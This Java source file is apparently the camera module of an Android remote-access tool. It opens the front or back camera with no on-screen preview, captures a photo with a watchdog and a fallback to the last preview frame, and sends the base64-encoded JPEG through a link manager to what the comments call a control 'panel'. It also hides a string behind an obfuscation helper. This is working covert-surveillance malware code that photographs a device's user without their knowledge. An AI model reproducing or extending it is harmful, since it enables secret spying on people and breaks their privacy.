package com.piupiupiu;


import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.graphics.SurfaceTexture;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.Parameters;
import android.util.Base64;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;


public class CameraManager {

    /** 看门狗超时（毫秒）：超时仍未拿到照片就兜底出图/回传失败，避免"点了没反应、连错误都没有"。 */
    private static final long WATCHDOG_MS = 10000;

    private Context context ;
    private Camera camera;
    /** 保存引用，防止 SurfaceTexture 被 GC 提前回收导致预览/拍摄挂起。 */
    private SurfaceTexture dummyTexture;
    /** 是否已有结果（看门狗与回调互斥，避免重复发送）。 */
    private final AtomicBoolean pictureDone = new AtomicBoolean(false);

    // ---- 诊断 / 兜底用的采集状态 ----
    private volatile int previewFrames = 0;
    private volatile byte[] lastPreviewFrame = null;
    private int previewW = 0, previewH = 0, previewFmt = 0;
    private String focusDesc = "default";
    private int camId = -1;


    public CameraManager(Context context) {
        this.context = context;
    }


    public void startUp(int cameraID){
        camId = cameraID;

        // 1) 打开相机（失败也要回传，不能静默）
        try {
            camera = Camera.open(cameraID);
        } catch (Throwable t) {
            Dispatcher.reportError(Protocol.CAMERA, t);
            return;
        }

        // 2) 参数 + 预览（挂假 SurfaceTexture 支持无显示采集）
        try {
            Parameters parameters = camera.getParameters();
            // 优先连续对焦：部分机型默认的一次性 AF 在弱光下迟迟不完成，
            // takePicture 会一直等对焦、回调永远不来（表现为"超时无照片"）。
            try {
                List<String> modes = parameters.getSupportedFocusModes();
                if (modes != null && modes.contains(Parameters.FOCUS_MODE_CONTINUOUS_PICTURE)) {
                    parameters.setFocusMode(Parameters.FOCUS_MODE_CONTINUOUS_PICTURE);
                } else if (modes != null && modes.contains(Parameters.FOCUS_MODE_CONTINUOUS_VIDEO)) {
                    parameters.setFocusMode(Parameters.FOCUS_MODE_CONTINUOUS_VIDEO);
                }
            } catch (Throwable ignored) { /* 保持设备默认对焦 */ }
            camera.setParameters(parameters);

            Parameters effective = camera.getParameters();
            previewW = effective.getPreviewSize().width;
            previewH = effective.getPreviewSize().height;
            previewFmt = effective.getPreviewFormat();
            focusDesc = effective.getFocusMode();

            dummyTexture = new SurfaceTexture(0); // 存入字段防 GC
            try { dummyTexture.setDefaultBufferSize(previewW, previewH); } catch (Throwable ignored) {}
            camera.setPreviewTexture(dummyTexture);

            // 用 PreviewCallbackWithBuffer 驱动采集管线：一些机型在"无显示消费"的
            // 假 SurfaceTexture 上不会真正出帧，takePicture 回调因而永不触发。
            // 先挂回调 + 投喂缓冲再 startPreview；缓冲用完不回收，帧只用于诊断/兜底。
            try {
                camera.setPreviewCallbackWithBuffer(new Camera.PreviewCallback() {
                    @Override
                    public void onPreviewFrame(byte[] data, Camera cam) {
                        if (data == null) return;
                        previewFrames++;
                        lastPreviewFrame = data; // 缓冲不再投喂回去，引用可安全持有
                    }
                });
                int bufSize = previewW * previewH * ImageFormat.getBitsPerPixel(previewFmt) / 8;
                if (bufSize > 0) {
                    camera.addCallbackBuffer(new byte[bufSize]);
                    camera.addCallbackBuffer(new byte[bufSize]);
                    camera.addCallbackBuffer(new byte[bufSize]);
                }
            } catch (Throwable ignored) { /* 驱动失败仍继续尝试 takePicture */ }

            camera.startPreview();
        } catch (Throwable t) {
            // 预览起不来时继续 takePicture 只会静默无响应：直接回传原因并放弃本次拍照。
            releaseCamera();
            Dispatcher.reportError(Protocol.CAMERA, t);
            return;
        }

        // 3) 看门狗：超时没有照片（相机被系统/ROM 挂起、回调不来）→ 有预览帧就兜底出图，
        //    没有则带诊断信息回传失败。
        new Thread(new Runnable() {
            @Override
            public void run() {
                long deadline = System.currentTimeMillis() + WATCHDOG_MS;
                while (System.currentTimeMillis() < deadline) {
                    if (pictureDone.get()) return;
                    try {
                        Thread.sleep(200);
                    } catch (InterruptedException ie) {
                        return;
                    }
                }
                if (pictureDone.compareAndSet(false, true)) {
                    finishWithFallback("camera timeout: no picture within " + (WATCHDOG_MS / 1000) + "s");
                }
            }
        }, "cam-watchdog").start();

        // 4) 拍照
        try {
            camera.takePicture(null, null, new PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    if (!pictureDone.compareAndSet(false, true)) return;
                    try {
                        releaseCamera();
                        sendPhoto(data);
                    } catch (Throwable t) {
                        // 拍照后处理失败（解码/压缩/回传）同样要回传，否则面板只看到“没反应”
                        Dispatcher.reportError(Protocol.CAMERA, t);
                    }
                }
            });
        } catch (Throwable t) {
            // takePicture 同步失败：不等看门狗，立即走同一兜底出口
            if (pictureDone.compareAndSet(false, true)) {
                finishWithFallback("camera capture failed: " + t);
            }
        }
    }

    /**
     * 超时/同步失败的统一出口：
     *  - 拿得到预览帧（且格式为 NV21）→ 用最后一帧编码 JPEG 直接当照片发出去（质量略低，但不空手）；
     *  - 拿不到 → 报告带诊断信息的失败（预览帧数/分辨率/对焦），便于判断是 ROM 后台限制还是管线问题。
     */
    private void finishWithFallback(String reason) {
        byte[] frame = lastPreviewFrame;
        int frames = previewFrames;
        releaseCamera();

        if (frame != null && previewFmt == ImageFormat.NV21 && previewW > 0 && previewH > 0) {
            try {
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                new YuvImage(frame, ImageFormat.NV21, previewW, previewH, null)
                        .compressToJpeg(new Rect(0, 0, previewW, previewH), 70, bos);
                sendPhoto(bos.toByteArray());
                return;
            } catch (Throwable t) {
                reason += " (preview frames=" + frames + ", fallback failed: " + t + ")";
            }
        } else {
            reason += " (preview frames=" + frames + ", cam id " + camId + ", "
                    + previewW + "x" + previewH + ", fmt " + previewFmt + ", focus " + focusDesc + ")";
        }
        Dispatcher.reportError(Protocol.CAMERA, new RuntimeException(reason));
    }


    private void sendPhoto(byte [] data) throws Exception {

        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos);
        JSONObject object = new JSONObject();
        object.put("image",true);

        int jpegBytes = bos.size();
        object.put("buffer" , Base64.encodeToString(bos.toByteArray(), Base64.DEFAULT));
        if (!LinkManager.getInstance().send(Protocol.CAMERA , object)) {
            // 上传失败不能沉默：抛出去，由回调层回传一条小错误帧
            // （照片帧可能因体积/超时过不去，但小错误帧能过，面板能看到原因）
            throw new RuntimeException("picture upload failed (jpeg=" + jpegBytes + " bytes)");
        }
    }

    private synchronized void releaseCamera(){
        if (camera != null) {
            // 预览可能从未成功启动；每一步单独兜底，别让释放本身抛异常中断回传
            try { camera.stopPreview(); } catch (Exception e) { /* ignore */ }
            try { camera.release(); } catch (Exception e) { /* ignore */ }
            camera = null;
        }
    }

    public JSONObject findCameraList() {

        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            return null;
        }




        try {
            JSONObject cameras = new JSONObject();
            JSONArray list = new JSONArray();
            cameras.put(StrCodec.dec("EyY="), true);

            // Search for available cameras
            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Front");
                    jo.put("id", i);
                    list.put(jo);
                }
                else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK){
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Back");
                    jo.put("id", i);
                    list.put(jo);
                }
                else {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Other");
                    jo.put("id", i);
                    list.put(jo);
                }
            }

            cameras.put("list" , list);
            return cameras;

        } catch (JSONException e) {
            e.printStackTrace();
        }

        return null;

    }




}
